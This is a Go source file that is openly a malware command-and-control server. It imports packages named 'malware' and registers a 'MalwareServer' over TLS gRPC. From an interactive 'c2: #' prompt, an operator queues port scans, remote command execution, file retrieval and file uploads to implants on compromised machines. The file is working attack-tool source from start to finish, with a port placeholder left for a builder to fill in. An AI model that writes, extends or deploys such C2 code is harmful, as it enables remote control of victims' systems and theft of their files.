package main

import (
	"context"
	"fmt"
	"github.com/carmark/pseudo-terminal-go/terminal"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"io"
	"io/ioutil"
	"malware/common"
	pb "malware/common/messages"
	"malware/common/types"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

type c2 struct {
	port  int
	queue chan *pb.CheckCmdReply
	term  *terminal.Terminal
}

func (c2 *c2) writeString(str string) {
	c2.term.Write([]byte(str))
}

func (c2 *c2) handleReply(reply *pb.ImplantReply) {
	if err := reply.GetError(); err != 0 {
		c2.writeString("Error: " + types.ErrorToString[err] + "\n")
	} else {

		c2.writeString(strings.Replace(reply.String(), "\\n", "\n", -1))
		c2.writeString("\n")
	}
}

func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
	switch u := req.Message.(type) {
	case *pb.CheckCmdRequest_Heartbeat:
		select {
		case x, ok := <-c2.queue:
			fmt.Println(x)
			if ok {
				return x, nil
			} else {
				common.Panic("QUeue closed")
			}
		default:
		}
	case *pb.CheckCmdRequest_Reply:
		c2.handleReply(u.Reply)
	default:
		common.Panic("Didn't receive a valid message", req, u)
	}
	return &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Heartbeat{Heartbeat: time.Now().Unix()}}, nil
}

func (c2 *c2) handle(text string) {
	parts := strings.Split(strings.TrimSpace(text), " ")
	switch parts[0] {
	case "portscan":
		start, _ := strconv.Atoi(parts[2])
		end, _ := strconv.Atoi(parts[3])
		message := &pb.PortScan{Ip: parts[1], StartPort: int32(start), EndPort: int32(end)}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Portscan{Portscan: message}}
	case "exec":
		message := &pb.Exec{Exec: parts[1], Args: parts[2:]}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Exec{Exec: message}}
	case "getfile":
		message := &pb.GetFile{Filename: parts[1]}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Getfile{Getfile: message}}
	case "putfile":
		out, err := ioutil.ReadFile(parts[2])
		if err != nil {
			common.Panicf(err, "Erroring loading file")
		}
		message := &pb.UploadFile{Filename: parts[1], Contents: out}
		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Uploadfile{Uploadfile: message}}
	default:
		c2.term.Write([]byte("Cmd not found: "))
		c2.term.Write([]byte(parts[0] + "\n"))
		fmt.Println()
	}
}
func (c2 *c2) ReadUserInput() {
	line, err := c2.term.ReadLine()
	defer func() { recover() }()
	for {
		if err == io.EOF {
			return
		} else if (err != nil && strings.Contains(err.Error(), "control-c break")) || len(line) == 0 {
			line, err = c2.term.ReadLine()
		} else {
			c2.handle(line)

			line, err = c2.term.ReadLine()
		}
	}

}

func main() {
	// TODO: Replace with %PORT%
	// TODO: Replacewith %certfile% %keyfile%

	if len(os.Args) != 3 {
		panic("Require Cert and Key as argument")
	}

	creds, err := credentials.NewServerTLSFromFile(os.Args[1], os.Args[2])

	if err != nil {
		panic(err)
	}

	c2 := &c2{port: _C2_PORT_, queue: make(chan *pb.CheckCmdReply, 100)}
	host := fmt.Sprintf(":%d", c2.port)
	listener, err := net.Listen("tcp", host)

	if err != nil {
		common.Panicf(err, "Hosting on %s failed", host)
	}

	defer listener.Close()

	server := grpc.NewServer(grpc.Creds(creds))

	pb.RegisterMalwareServer(server, c2)

	term, err := terminal.NewWithStdInOut()
	if err != nil {
		panic(err)
	}
	fmt.Println("Ctrl-D to break")
	term.SetPrompt("c2: # ")

	c2.term = term

	go func() {
		defer term.ReleaseFromStdInOut()
		c2.ReadUserInput()
		server.Stop()

	}()
	server.Serve(listener)
	fmt.Println("Exiting")
}
